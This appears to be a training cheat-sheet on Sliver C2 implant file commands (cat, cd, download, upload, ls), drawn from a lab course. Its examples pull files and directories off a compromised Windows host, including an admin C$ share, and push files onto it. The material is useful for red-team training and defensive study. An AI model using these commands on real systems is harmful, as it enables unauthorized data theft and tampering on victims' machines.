# 15.09 File Operations download upload cat cd

> Move files without spawning a shell — `download` tarballs directories, `upload` accepts mixed slashes, `cat` supports hex + loot save.

## Overview

Sliver provides native file transfer and navigation commands that avoid spawning an interactive shell. `download` compresses directories to .tar.gz. `upload` supports both backslash-escaped and forward-slash Windows paths. `cat` supports hex dump and loot-save modes.

## Steps

- `cat <remote-path>` prints file contents; use `--hex` for binary files.
- `cd <path>` changes working directory in the implant context.
- `download <remote-path>` pulls a file or directory; directories are gzip-tarred.
- `upload <local-path> <remote-path>` pushes a file; escape backslashes or use forward slashes.
- `ls <path>` lists directory contents without spawning a shell.

## Commands

### Read remote file

```text
sliver (http-session) > cat academy.txt
```

### Change directory

```text
sliver (http-beacon) > cd C:\Users
```

### Download file

```text
sliver (http-session) > download Pictures
```

### Upload with escaped backslashes

```text
sliver (http-session) > upload academy.txt C:\\Users\\eric\\Desktop\\academy.txt
```

### Upload with forward slashes

```text
sliver (http-session) > upload academy.txt C:/Users/eric/Desktop/academy.txt
```

### List remote directory

```text
sliver (http-beacon) > ls //srv01.child.htb.local/c$
```
